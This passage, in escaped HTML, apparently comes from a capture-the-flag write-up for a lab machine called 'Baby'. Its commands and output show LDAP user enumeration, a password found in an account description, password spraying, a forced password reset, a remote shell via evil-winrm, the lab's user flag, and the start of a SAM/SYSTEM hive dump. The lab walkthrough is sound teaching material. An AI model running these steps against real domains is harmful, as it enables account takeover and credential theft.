\u0026#34;DC=baby,DC=vl\u0026#34; \u0026#34;(objectClass=user)\u0026#34; | grep dn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eGuest,CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eUsers,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eJacqueline Barnett,OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003edev,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eAshley Webb,OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003edev,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eHugh George,OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003edev,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eLeonard Dyer,OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003edev,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eConnor Wilkinson,OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eit,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eJoseph Hughes,OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eit,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eKerry Wilson,OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eit,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eTeresa Bell,OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eit,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edn: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eCaroline Robinson,OU\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eit,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebaby,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIndeed, null bind is enabled, so we retrieve a list of users. The next step is to check the description field, which may contain sensitive information:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:24:29 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# ldapsearch -x -H ldap://baby.vl:3268 -b \u0026#34;DC=baby,DC=vl\u0026#34; \u0026#34;(objectClass=user)\u0026#34; | grep desc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edescription: Built-in account \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e guest access to the computer/domain\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edescription: Set initial password to BabyStart123!\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eBam! A password!\u003c/p\u003e\n\u003cp\u003eThis password is in Teresa\u0026rsquo;s description. Let\u0026rsquo;s verify if it works:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:26:45 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb 10.10.117.161 -u teresa.bell -p \u0026#39;BabyStart123!\u0026#39; --no-bruteforce\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e Build \u003cspan style=\"color:#ae81ff\"\u003e20348\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:BABYDC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:baby.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:False\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003eeresa.bell:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"user-flag\"\u003eUser Flag\u003c/h2\u003e\n\u003ch4 id=\"password-spraying\"\u003ePassword Spraying\u003c/h4\u003e\n\u003cp\u003eIt doesn\u0026rsquo;t work for this user, so we\u0026rsquo;ll generate a user list from the ones we retrieved with LDAP to perform password spraying:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:32:23 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb 10.10.117.161 -u users_list.txt -p \u0026#39;BabyStart123!\u0026#39; --no-bruteforce\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e Build \u003cspan style=\"color:#ae81ff\"\u003e20348\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:BABYDC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:baby.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:False\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\g\u003c/span\u003euest:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\j\u003c/span\u003eacqueline.barnett:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\a\u003c/span\u003eshley.webb:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\h\u003c/span\u003eugh.george:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\l\u003c/span\u003eeonard.dyer:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\c\u003c/span\u003eonnor.wilkinson:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\j\u003c/span\u003eoseph.hughes:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\k\u003c/span\u003eerry.wilson:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003eeresa.bell:BabyStart123! STATUS_LOGON_FAILURE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.117.161   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BABYDC           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e baby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\c\u003c/span\u003earoline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOk! We have Caroline who needs to have her password BabyStart123! changed:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:34:05 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# smbpasswd -r 10.10.117.161 -U \u0026#34;Caroline.Robinson\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eOld SMB password:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNew SMB password:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRetype new SMB password:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePassword changed \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e user Caroline.Robinson on 10.10.117.161.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eNow, we\u0026rsquo;ll connect with WinRM using Caroline\u0026rsquo;s credentials:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e**\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:35:37 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# evil-winrm -i 10.10.117.161 -u \u0026#39;caroline.robinson\u0026#39; -p \u0026#39;Test123\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEvil-WinRM shell v3.7\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInfo: Establishing connection to remote endpoint\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe get the user flag:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e*Evil-WinRM* PS C:\u003cspan style=\"color:#ae81ff\"\u003e\\U\u003c/span\u003esers\u003cspan style=\"color:#ae81ff\"\u003e\\C\u003c/span\u003earoline.Robinson\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eesktop\u0026gt; cat \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;C:/Users/Caroline.Robinson/Desktop/user.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eVL\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003eb2c6150b85125d32f4b253df9540d898\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"administrator-flag\"\u003eAdministrator Flag\u003c/h2\u003e\n\u003ch4 id=\"privilege-escalation\"\u003ePrivilege Escalation\u003c/h4\u003e\n\u003cp\u003eWith \u003ccode\u003ewhoami /all\u003c/code\u003e we can see Caroline\u0026rsquo;s privileges, and we can see that she has SeRestore and SeBackupPrivilege privileges:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e*Evil-WinRM* PS C:\u003cspan style=\"color:#ae81ff\"\u003e\\U\u003c/span\u003esers\u003cspan style=\"color:#ae81ff\"\u003e\\C\u003c/span\u003earoline.Robinson\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eocuments\u0026gt; whoami /all\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUSER INFORMATION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e----------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUser Name              SID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e======================\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==============================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby\u003cspan style=\"color:#ae81ff\"\u003e\\c\u003c/span\u003earoline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGROUP INFORMATION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-----------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGroup Name                                 Type             SID                                            Attributes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e==========================================\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e================\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==============================================\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==================================================\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEveryone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBUILTIN\u003cspan style=\"color:#ae81ff\"\u003e\\B\u003c/span\u003eackup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBUILTIN\u003cspan style=\"color:#ae81ff\"\u003e\\U\u003c/span\u003esers                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBUILTIN\u003cspan style=\"color:#ae81ff\"\u003e\\P\u003c/span\u003ere-Windows \u003cspan style=\"color:#ae81ff\"\u003e2000\u003c/span\u003e Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBUILTIN\u003cspan style=\"color:#ae81ff\"\u003e\\R\u003c/span\u003eemote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNT AUTHORITY\u003cspan style=\"color:#ae81ff\"\u003e\\N\u003c/span\u003eETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNT AUTHORITY\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003euthenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNT AUTHORITY\u003cspan style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003ehis Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBABY\u003cspan style=\"color:#ae81ff\"\u003e\\i\u003c/span\u003et                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNT AUTHORITY\u003cspan style=\"color:#ae81ff\"\u003e\\N\u003c/span\u003eTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMandatory Label\u003cspan style=\"color:#ae81ff\"\u003e\\H\u003c/span\u003eigh Mandatory Level       Label            S-1-16-12288\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePRIVILEGES INFORMATION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e----------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePrivilege Name                Description                    State\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e=============================\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==============================\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=======\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSeMachineAccountPrivilege     Add workstations to domain     Enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSeBackupPrivilege             Back up files and directories  Enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSeRestorePrivilege            Restore files and directories  Enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSeShutdownPrivilege           Shut down the system           Enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUSER CLAIMS INFORMATION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-----------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUser claims unknown.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eKerberos support \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e Dynamic Access Control on this device has been disabled.**\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThis will allow us to dump the SAM and SYSTEM hives to retrieve passwords and escalate our privileges:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e*Evil-WinRM* PS C:\u003cspan style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003eemp\u0026gt; reg save hklm\u003cspan style=\"color:#ae81ff\"\u003e\\s\u003c/span\u003eam c:\u003cspan 